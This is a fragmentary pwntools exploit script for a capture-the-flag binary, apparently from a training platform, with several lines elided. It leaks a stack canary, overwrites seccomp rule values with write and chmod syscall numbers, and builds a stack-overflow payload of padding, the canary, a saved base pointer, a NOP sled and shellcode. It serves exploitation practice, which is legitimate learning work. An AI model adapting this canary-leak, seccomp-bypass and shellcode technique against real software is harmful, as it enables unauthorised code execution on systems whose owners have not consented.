...
exe = context.binary = ELF(args.EXE or '/challenge/toddlerone-level-5-0')
...
# Canary Leak
io.recvuntil(b'size: ')
offset_canary = 120  # rbp-0x18 (not def position)
...
syscall
""")
offset_sec_comp_rules = 112  # rbp-0x18 (not def position)
payload = b'A' * (offset_sec_comp_rules) + p32(write_syscall_num) + p32(chmod_syscall_num) + p64(canary) + b'B' * 24 + p64(rbp) + b'\x90' * 500 + shellcode
